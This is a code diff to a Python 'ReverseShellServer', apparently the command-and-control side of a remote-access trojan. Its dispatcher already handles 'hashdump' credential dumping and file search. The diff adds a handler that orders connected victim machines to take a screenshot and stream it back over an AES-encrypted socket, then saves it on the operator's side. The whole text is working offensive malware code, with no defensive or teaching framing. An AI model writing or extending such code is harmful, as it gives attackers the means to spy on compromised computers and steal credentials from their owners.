@@ -1,9 +1,8 @@
 import socket
 import threading
 from aes_crypt import AESCipher
-from base64 import b64encode, b64decode
+from base64 import b64decode
 import os
-import re
 
 
 class ReverseShellServer:
@@ -138,10 +137,27 @@ class ReverseShellServer:
                 self.handle_search(args, conn)
             elif agent_command == "hashdump":
                 self.handle_hashdump(conn)
+            elif agent_command == "screenshot":
+                self.handle_screenshot(conn, client_id)
             else:
                 self.send_command(agent_command + " " + args, conn)
         else:
             print(f"[x] Error: Client {client_id} not found")
+
+    def handle_screenshot(self, conn, client_id):
+        file_path = f"screenshot_{client_id}.png"
+        conn.send(AESCipher.encrypt("screenshot").encode("utf-8"))
+        try:
+            with open(file_path, "wb") as f:
+                while True:
+                    data = conn.recv(4096).decode("utf-8")
+                    decrypted_data = AESCipher.decrypt(data)
+                    if decrypted_data == "EOF":
+                        break
+                    f.write(b64decode(decrypted_data))
+            print(f"[+] Screenshot saved to {file_path}.")
+        except Exception as e:
+            print(f"[x] Failed to save screenshot: {e}")
 
     def handle_ipconfig(self, conn, client_id):
         os_type = self.client_id_map[client_id]["os"]
